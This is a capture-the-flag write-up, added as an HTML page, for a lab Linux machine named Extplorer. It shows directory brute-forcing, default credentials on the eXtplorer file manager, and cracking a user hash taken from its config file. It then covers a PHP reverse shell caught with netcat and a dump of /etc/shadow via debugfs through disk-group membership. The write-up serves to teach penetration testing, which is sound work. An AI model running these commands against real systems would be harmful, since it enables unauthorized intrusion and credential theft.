@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Extplorer &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Extplorer</h1>
+    <div class="meta">Target: <code>192.168.176.16</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Gobuster</span><span class="tag">DefaultCreds</span><span class="tag">john</span><span class="tag">credentialhunting</span><span class="tag">LinuxGroups</span><span class="tag">diskgroup</span><span class="tag">debugfs</span><span class="tag">infodisclosure</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#default-credentials-on-extplorer">Default Credentials on eXtplorer</a><a class="lvl3" href="#hunting-credentials-in-the-config">Hunting Credentials in the Config</a><a class="lvl3" href="#reverse-shell-as-www-data">Reverse Shell as www-data</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#the-disk-group-reading-etc-shadow-with-debugfs">The disk Group → Reading /etc/shadow with debugfs</a><a class="lvl3" href="#cracking-root">Cracking root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Extplorer is a Linux machine that rewards patient web enumeration and then teaches one of the more elegant Linux privilege escalations: abusing membership in the <code>disk</code> group. The chain runs web directory brute force, a file manager protected only by default credentials, credentials hunted out of a config file on disk, a reverse shell as <code>www-data</code>, a lateral move to a real user, and finally a raw-disk read of <code>/etc/shadow</code> via <code>debugfs</code> because that user sits in the <code>disk</code> group.</p>
+<h2 id="recon">Recon</h2>
+<p>The web root just redirects into a WordPress setup wizard, which is a hint that more is mounted alongside it. So I brute-forced directories:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.176.16 -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/filemanager          (Status: 301) [--&gt; /filemanager/]
+/wordpress            (Status: 301) [--&gt; /wordpress/]
+/wp-admin             (Status: 301) [--&gt; /wp-admin/]
+/wp-content           (Status: 301)
+/wp-includes          (Status: 301)
+</code></pre>
+<p><code>/wordpress</code> is expected, but <code>/filemanager</code> is the interesting one, a separate application bolted onto the same host.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="default-credentials-on-extplorer">Default Credentials on eXtplorer</h3>
+<p><code>/filemanager</code> serves an <strong>eXtplorer</strong> login. Before reaching for exploits, the cheapest attack on any admin panel is the vendor's default login, and it worked:</p>
+<pre><code>admin : admin
+</code></pre>
+<blockquote>
+<p><strong>Why default creds keep working:</strong> appliance-style web apps ship with a documented default account so the first boot isn't locked out. Admins are supposed to change it during setup; on a surprising number of real systems they never do. It costs one request to check, so it's always step one.</p>
+</blockquote>
+<h3 id="hunting-credentials-in-the-config">Hunting Credentials in the Config</h3>
+<p>eXtplorer stores its own user database in a PHP file, and as an authenticated admin I could read it directly through the file manager:</p>
+<pre><code class="language-php">// /filemanager/config/.htusers.php
+$GLOBALS[&quot;users&quot;]=array(
+  array('admin','‹redacted›', ...),
+  array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS', ...),
+);
+</code></pre>
+<p>The <code>admin</code> entry is an MD5 of "admin", but <code>dora</code> carries a bcrypt hash (<code>$2a$</code>), a real user worth cracking. I copied it out and fed it to John:</p>
+<pre><code class="language-sh">john dora.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+‹redacted›         (?)
+</code></pre>
+<p>Giving me:</p>
+<pre><code>dora : ‹redacted›
+</code></pre>
+<h3 id="reverse-shell-as-www-data">Reverse Shell as www-data</h3>
+<p><code>dora</code>'s password didn't work over SSH (no shell permissions), so I used eXtplorer's upload feature to plant a PHP reverse shell in the web root and triggered it:</p>
+<pre><code class="language-sh">http://192.168.176.16/wp-admin/php-reverse-shell.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [...] from [...]
+$ whoami
+www-data
+</code></pre>
+<blockquote>
+<p><strong>Foothold vs. user:</strong> landing as <code>www-data</code> is just the web server's identity, deliberately low-privilege. But I already had <code>dora</code>'s cleartext password, so the next move was to <em>become a real user</em> whose group memberships might be more interesting.</p>
+</blockquote>
+<p>I switched to <code>dora</code> with the cracked password and upgraded to a proper TTY:</p>
+<pre><code class="language-sh">su dora
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="the-disk-group-reading-etc-shadow-with-debugfs">The disk Group → Reading /etc/shadow with debugfs</h3>
+<p>The first thing to check after switching users is <code>id</code>:</p>
+<pre><code class="language-sh">dora@dora:/$ id
+uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
+</code></pre>
+<p><code>dora</code> belongs to group <code>6(disk)</code>. That's the whole escalation.</p>
+<blockquote>
+<p><strong>Why <code>disk</code> group equals root:</strong> members of <code>disk</code> get read/write access to the block devices in <code>/dev</code> (like <code>/dev/sda</code>). The filesystem's permission model, users, groups, root, lives <em>inside</em> the filesystem. If you can read the raw device under it, none of those permissions apply. <code>debugfs</code> is a filesystem debugger that opens the block device directly, so a <code>disk</code>-group user can read any file on the partition, including <code>/etc/shadow</code>, completely bypassing file ownership.</p>
+</blockquote>
+<p>First I found where <code>/</code> is mounted:</p>
+<pre><code class="language-sh">dora@dora:~$ df -h
+/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.3G  55% /
+</code></pre>
+<p>Then opened that device with <code>debugfs</code> and read the shadow file straight off the disk:</p>
+<pre><code class="language-sh">dora@dora:/$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+debugfs:  cat /etc/shadow
+root:‹redacted›:19453:0:99999:7:::
+...
+dora:‹redacted›:19453:0:99999:7:::
+</code></pre>
+<h3 id="cracking-root">Cracking root</h3>
+<p>With root's <code>$6$</code> (sha512crypt) hash in hand, John did the rest:</p>
+<pre><code class="language-sh">john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+‹redacted›         (root)
+</code></pre>
+<h2 id="root">Root</h2>
+<p>I re-established my <code>www-data</code> shell, then <code>su</code>'d straight to root with the cracked password:</p>
+<pre><code class="language-sh">$ su root
+Password: ‹redacted›
+# whoami
+root
+# cat /root/proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Enumerate every directory, not just the obvious app.</strong> The WordPress redirect was a decoy; <code>/filemanager</code> was the real door.</li>
+<li><strong>Default credentials before exploits.</strong> <code>admin:admin</code> saved a lot of time.</li>
+<li><strong><code>id</code> is the first privesc command.</strong> Membership in <code>disk</code> (also <code>adm</code>, <code>lxd</code>, <code>docker</code>, <code>shadow</code>) is effectively root because it bypasses the filesystem permission layer. <code>debugfs</code> turns raw-disk read into an <code>/etc/shadow</code> dump.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
